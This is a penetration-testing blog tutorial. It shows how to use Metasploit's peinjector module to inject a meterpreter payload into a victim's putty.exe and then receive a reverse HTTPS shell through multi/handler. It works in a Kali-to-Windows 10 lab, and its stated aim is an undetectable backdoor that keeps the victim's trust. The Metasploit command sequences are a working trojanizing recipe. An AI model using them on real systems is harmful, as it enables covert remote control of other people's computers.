<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Metasploit for Pentester: Inject Payload into Executable</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/metasploit-for-pentester-inject-payload-into-executable/" rel="bookmark"><time class="entry-date published" datetime="2021-07-29T17:29:42+00:00">July 29, 2021</time><time class="updated" datetime="2025-05-12T21:17:36+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong data-start="850" data-end="895">Metasploit inject payload into executable</strong> is a powerful technique used by <strong data-start="928" data-end="942">pentesters</strong> to create <strong data-start="953" data-end="966">backdoors</strong> within legitimate files. Being lurking and undetectable is the priority after anonymity. In this article, we are going to learn how to create an innocuous-looking <strong data-start="1130" data-end="1142">backdoor</strong> and bind it with a legitimate <strong data-start="1173" data-end="1192">executable file</strong> to gain the victim’s trust.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Pre-requisites for Lab set up</span></li>
<li><span style="color: #000000;">Executable file search on victim’s PC</span></li>
<li><span style="color: #000000;">Using peinjector payload to bind with an executable file.</span></li>
</ul>
<h3><span style="color: #800000;">Pre-requisites for Lab set up</span></h3>
<ul>
<li><span style="color: #000000;">Kali Linux (Pentester Machine)</span></li>
<li><span style="color: #000000;">Window 10 Machine (Victim Machine)</span></li>
</ul>
<h3><span style="color: #800000;">Executable file search on victim’s PC</span></h3>
<p><span style="color: #000000;">Let’s Begin. There are multiple methods to take the meterpreter session of the target machine, so you can adapt any method to have the session of the victims’ PC. We already have a meterpreter session of the victim’s PC.</span></p>
<p><span style="color: #000000;">Here, our approach is to find the executable files that exist in the victim’s pc so that we can bind the payload with the legitimate executable files which will look generic to the user.</span></p>
<p><span style="color: #000000;">We explore the different paths and drives of the victim’s pc suddenly in the downloads we find the putty.exe file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bWAXvHssPbc/YQLib66CV_I/AAAAAAAAx-4/tRhq696_XikpgujP4hIkuXZEDFjjDWKYgCLcBGAsYHQ/s16000/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Introduction of Peinjector Module</strong></span></h3>
<p><span style="color: #000000;">This module will inject a specified windows payload into a target executable.</span></p>
<p><span style="color: #000000;">As we know that victim is using putty.exe which is found in downloads now next step is to inject the payload into it. To run this module we need to set the targetpe which means the path of the target executable file of the victim’s pc into which payload need to inject.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/manage/peinjector
msf6 post(windows/manage/peinjector) &gt; set targetpe C:\\Users\\ignite\\Downloads\\putty.exe
msf6 post(windows/manage/peinjector) &gt; set session 1
msf6 post(windows/manage/peinjector) &gt; set lhost 192.168.1.2
msf6 post(windows/manage/peinjector) &gt; set lport 443
msf6 post(windows/manage/peinjector) &gt; exploit</pre>
<p><span style="color: #000000;">Now, it will generate the payload and will inject the payload into the targeted executable exe. i.e. putty.exe</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GeYaZiPN3Fg/YQLiixSrjZI/AAAAAAAAx-8/kgeZ_sOtOUIT64kim2CvCDjOtOoRpjGQACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">The <strong data-start="279" data-end="290">payload</strong> was already injected in the previous step. Now, it’s time to get the connection back on our machine by using the <strong data-start="404" data-end="421">multi handler</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https
msf6 exploit(multi/handler) &gt; set lhost 192.168.1.2
msf6 exploit(multi/handler) &gt; set lport 443
msf6 exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8kl088cO2gw/YQLjZhHhYeI/AAAAAAAAx_c/s8dC8uebxSIOsL_W1Vo34gzaYws79mX4gCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Since the <strong data-start="434" data-end="444">victim</strong> is not aware of the <strong data-start="465" data-end="477">backdoor</strong> created by the <strong data-start="493" data-end="515">peinjector payload</strong>, whenever the victim tries to use the <strong data-start="554" data-end="567">putty.exe</strong> file, it will look legitimate to him. Moreover, he will not observe any change in the functionality of <strong data-start="671" data-end="680">putty</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SEwYTdKqFMc/YQLitAoYmDI/AAAAAAAAx_I/xO0MdIYSxxYB9vk4OF-7OdvGRHSr6wufgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Once the victim clicks on the <strong data-start="713" data-end="722">putty</strong> icon, he will notice nothing unusual. However, in the background, the <strong data-start="793" data-end="804">payload</strong> will execute and we will get a <strong data-start="836" data-end="847">session</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BvQ_qOKj42A/YQLi0YdTb9I/AAAAAAAAx_Q/P9hM65yOZlczxHB-68eUfbcQmL6E1KkhgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Sharma is an Experienced and Certified Security Consultant.Highly skilled in Infrastructure, web pentesting along SIEM and other security devices. Connect with he</span>r <a href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
